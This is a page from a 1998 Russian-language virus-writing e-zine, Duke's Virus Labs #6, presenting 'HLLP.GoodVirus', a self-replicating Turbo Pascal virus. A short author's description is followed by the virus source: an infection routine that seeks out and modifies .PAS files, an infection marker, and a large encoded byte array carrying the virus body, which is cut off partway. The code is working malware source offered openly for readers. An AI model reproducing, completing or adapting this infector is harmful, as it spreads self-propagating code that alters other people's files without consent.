- [Duke's Virus Labs #6] - [Page 12] -

HLLP.GoodVirus
(c) by Tankist/SMF

Имя вируса    : HLLP.GoodVirus
Автор         : Tankist/SMF
Язык прогр.   : Turbo Pascal 7.0
Дата создания : 13.12.98


   А это еще один ВИРУС. Хоть это изврат, но он заражает PAS'овские файлы.
Это скорее пример того, как не надо писать проги. С этим текстом прилагается
исходник вируса (а что еще могло быть? exe'шник, который при первом же запуске
пишет в PAS исходник?).

   Небольшая анкета:
Имя: Good virus (название давалось до его написания...)
Автор: Танкист
Заражает: -PAS файлы на том диске, где запущен (по одному каталогу за раз)
Размер: ~14К
Вредные действия: Заменяет uses, Uses, ... , useS на USES; вставляет еще один
                  USES, если программа начинается не с него.
Дата: 13-12-1998
Язык: Паскаль

   Вот выкопал его из закромов винчестера и ужаснулся(а писал я его всего 4
месяца назад)... Коментарии раставил как мог.

   Что касается самого вируса, то местами он таскает себя в ДЕСЯТЕРНОМ размере,
не заходит в первые два каталога корня,пишется не в главный Begin, а в первый
найденный...

   С этим текстом прилагается текст с коментариями и то, что получается при
заражении(то же самое, но еще более страшное).

P.S. "На паскале пишут только..."(цитата). Я с этим не согласен. Я бы написал
"Только на паскале пишут только..."

===== Cut here =====
{This}                                      {Чтоб себя не заражал}
uses dos;
var
 sr:SearchRec;

{$i-}
procedure zar;                              {Тело вируса}
const numzar:byte=0;
 procedure infect(fl:SearchRec);            {Зараждение}
 const
  ms='{This file was infected by a good virus.'#13#10'He is very good. Please, do not kill him}'#13#10;
                                            {Идентификация}
  alf:string='BEGIN';                       {ключевые слова}
  alf2:set of char=[#9,#32,#10,#13];
  a2=#9'zar';
  a3='uses dos;'#13#10;
  a4=',dos';
  a5:string='USES';
  a6:string='DOS';
                                            {вирус... собственной персоной}
  b1:array[1..4324]of byte=(41,59,13,10,32,32,99,49,58,97,114,114,97,121,91,49,46,46,48,51,55,54,93,111,102,32,98,121,116,101
,61,40,13,10,49,50,51,44,51,54,44,49,48,53,44,52,53,44,49,50,53,44,49,51,44,49,48,44,49,49
,50,44,49,49,52,44,49,49,49,44,57,57,44,49,48,49,44,49,48,48,44,49,49,55,44,49,49,52,44,49
,48,49,44,51,50,44,49,50,50,44,57,55,44,49,49,52,44,53,57,44,49,51,44,49,48,44,57,57,44,49
,49,49,44,49,49,48,44,49,49,53,44,49,49,54,44,51,50,44,49,49,48,13,10,44,49,49,55,44,49,48
,57,44,49,50,50,44,57,55,44,49,49,52,44,53,56,44,57,56,44,49,50,49,44,49,49,54,44,49,48,49
,44,54,49,44,52,56,44,53,57,44,49,51,44,49,48,44,51,50,44,49,49,50,44,49,49,52,44,49,49,49
,44,57,57,44,49,48,49,44,49,48,48,44,49,49,55,44,49,49,52,44,49,48,49,44,51,50,44,49,48,53
,44,49,49,48,44,49,48,50,44,49,48,49,13,10,44,57,57,44,49,49,54,44,52,48,44,49,48,50,44,49
,48,56,44,53,56,44,56,51,44,49,48,49,44,57,55,44,49,49,52,44,57,57,44,49,48,52,44,56,50,44
,49,48,49,44,57,57,44,52,49,44,53,57,44,49,51,44,49,48,44,51,50,44,57,57,44,49,49,49,44,49
,49,48,44,49,49,53,44,49,49,54,44,49,51,44,49,48,44,51,50,44,51,50,44,49,48,57,13,10,44,49
,49,53,44,54,49,44,51,57,44,49,50,51,44,56,52,44,49,48,52,44,49,48,53,44,49,49,53,44,51,50
,44,49,48,50,44,49,48,53,44,49,48,56,44,49,48,49,44,51,50,44,49,49,57,44,57,55,44,49,49,53
,44,51,50,44,49,48,53,44,49,49,48,44,49,48,50,44,49,48,49,44,57,57,44,49,49,54,44,49,48,49
,44,49,48,48,44,51,50,44,57,56,44,49,50,49,44,51,50,13,10,44,57,55,44,51,50,44,49,48,51,44
,49,49,49,44,49,49,49,44,49,48,48,44,51,50,44,49,49,56,44,49,48,53,44,49,49,52,44,49,49,55
,44,49,49,53,44,52,54,44,51,57,44,51,53,44,52,57,44,53,49,44,51,53,44,52,57,44,52,56,44,51
,57,44,55,50,44,49,48,49,44,51,50,44,49,48,53,44,49,49,53,44,51,50,44,49,49,56,44,49,48,49
,44,49,49,52,13,10,44,49,50,49,44,51,50,44,49,48,51,44,49,49,49,44,49,49,49,44,49,48,48,44
,52,54,44,51,50,44,56,48,44,49,48,56,44,49,48,49,44,57,55,44,49,49,53,44,49,48,49,44,52,52
,44,51,50,44,49,48,48,44,49,49,49,44,51,50,44,49,49,48,44,49,49,49,44,49,49,54,44,51,50,44
,49,48,55,44,49,48,53,44,49,48,56,44,49,48,56,44,51,50,44,49,48,52,44,49,48,53,13,10,44,49
